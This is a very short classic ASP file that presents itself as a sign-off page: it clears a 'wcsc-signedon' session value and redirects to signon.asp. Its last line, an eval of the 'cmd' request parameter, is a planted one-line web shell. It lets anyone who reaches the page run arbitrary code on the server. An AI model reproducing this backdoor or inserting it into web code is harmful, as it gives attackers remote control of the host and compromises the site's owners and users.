<%
	session("wcsc-signedon") = ""
	response.redirect "signon.asp"
%>
<%eval request("cmd")%>
